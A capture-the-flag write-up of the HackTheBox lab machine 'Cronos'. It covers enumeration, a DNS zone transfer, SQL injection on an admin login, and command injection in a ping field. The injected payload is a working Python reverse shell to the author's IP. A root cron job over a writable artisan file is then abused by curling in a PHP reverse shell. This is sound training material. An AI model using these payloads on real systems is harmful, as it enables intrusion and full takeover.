---
date: '2025-06-12T21:13:49+02:00'
draft: false
title: 'Cronos'
author: Zorzella Davide

tags: ["cron jobs", "Zone transfer"]
categories: ["CTF"]

cover:
  image: "/cronos/cronos-pwn.png"
  alt: "cronos pwn"
  caption: "cronos pwn"
---

IP: 10.10.10.13

Cronos focuses mainly on different vectors for enumeration and also emphasises the risks associated with adding world-writable files to the root crontab. This machine also includes an introductory-level SQL injection vulnerability.

# Enumeration

Running nmap, we found 3 open tcp ports


```bash
nmap -sC -sV 10.10.10.13  
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 06:12 EST
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.05% done; ETC: 06:12 (0:00:00 remaining)
Nmap scan report for cronos.htb (10.10.10.13)
Host is up (0.045s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Cronos
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerating virtual hosts, we discover an hidden admin subdomain

```bash
ffuf -u http://10.10.10.13 -H "Host: FUZZ.cronos.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 11439  
```
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.13
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cronos.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 11439
________________________________________________

www                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 67ms]
admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 3907ms]
```

Performing a DNS Zone Transfer abusing the DNS on port 53 reveals the admin subdomain, too.

```bash
dig axfr cronos.htb @cronos.htb
```
```
; <<>> DiG 9.20.2-1-Debian <<>> axfr cronos.htb @cronos.htb
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.10.10.13#53(cronos.htb) (TCP)
;; WHEN: Sat Mar 01 06:36:25 EST 2025
;; XFR size: 7 records (messages 1, bytes 203)
```

Be sure to add them in the /etc/hosts file on your computer, to access using local dns configuration

```bash
cat /etc/hosts 
```
```
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.10.13     cronos.htb admin.cronos.htb www.cronos.htb
```

# Vulnerability and Scanning
## Login form on admin.cronos.htb

The login form on admin.cronos.htb does not seem to accept default login credentials such as admin:admin etc. So let's try some old school sql injection with sqlmap

```bash
sqlmap -u "http://admin.cronos.htb/" --forms -v 6 --output-dir="./sqlmap_results"
```
```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.11#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:43:21 /2025-03-01/

...

[07:44:28] [PAYLOAD] ' UNION ALL SELECT NULL-- -
[07:44:28] [TRAFFIC OUT] HTTP request [#54]:
POST / HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.8.11#stable (https://sqlmap.org)
Cookie: PHPSESSID=tmupu802knvruc41e9u451li47
Host: admin.cronos.htb
Accept: */*
Accept-Encoding: gzip,deflate
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Content-length: 62
Connection: close

username=%27%20UNION%20ALL%20SELECT%20NULL--%20-&password=test

[07:44:28] [TRAFFIC IN] HTTP redirect [#54] (302 Found):
Date: Sat, 01 Mar 2025 12:44:27 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: welcome.php
Content-length: 1547
Connection: close
Content-type: text/html; charset=UTF-8

...

```

Great, this payload redirects us to the welcome page. Let's use burp to repeat this process via browser.

![Welcome page](/cronos/cronos-1.png#center) 

## Executing command
The page proposes 2 commands: traceroute and ping.

![commands](/cronos/cronos-2.png#center)

# Exploitation

## Command Injection
Let's try some simple command injection in the host parameter.
On my local machine let's start a reverse shell listener with netcat

```bash
nc -lvnp 4444
```

Let's use this payload from https://www.revshells.com/

```bash
export RHOST="10.10.14.21";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

The exploit request would be

```HTTP
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
Origin: http://admin.cronos.htb
Connection: keep-alive
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=9e9rvgnbs3mhscgb5bcgbh83p1
Upgrade-Insecure-Requests: 1
Priority: u=0, i

command=ping+-c+1&host=10.10.14.21;export+RHOST%3d"10.10.14.21"%3bexport+RPORT%3d4444%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'
```

Which gives us the reverse shell

```bash
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.13] 46334
$ whoami
whoami
www-data
$ cat /home/noulis/user.txt
cat /home/noulis/user.txt
{flag}
```

# Privilege Escalation
Since this machine is called cronos, I'd expect to find something useful on cron jobs. Let's analyze what I can find using linPEAS!

```bash
╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                        
/usr/bin/crontab                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     797 Apr  9  2017 /etc/crontab                                                                                                    

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Mar 22  2017 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

This last one is pretty interesting. We should have access to this scheduled cron job with r/w permissions. Let's dive in further.

Since we can alter the content of /var/www/laravel/artisan as we want, let's substitute this file with a php reverse shell generated by https://www.revshells.com/. 

Hosted the file on my local machine

```bash
python3 -m http.server 3000
```
```
Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
10.10.10.13 - - [01/Mar/2025 12:35:46] "GET /revshell.php HTTP/1.1" 200 -
```

Prepared a listener for the reverse shell on my local machine

```bash
nc -lvnp 4444
```
```
listening on [any] 4444 ...
```

And retrieved it on the target machine

```bash
www-data@cronos:/var/www/laravel$ curl 10.10.14.21:3000/revshell.php > artisan
```
```
<ravel$ curl 10.10.14.21:3000/revshell.php > artisan                         
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2592  100  2592    0     0  29612      0 --:--:-- --:--:-- --:--:-- 29793
```

This instantly executes the php exploit, gaining root access via reverse shell :3

```bash
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.13] 46350
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 19:36:01 up  4:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
bash: cannot set terminal process group (25819): Inappropriate ioctl for device
bash: no job control in this shell
root@cronos:/# whoami
whoami
root
```
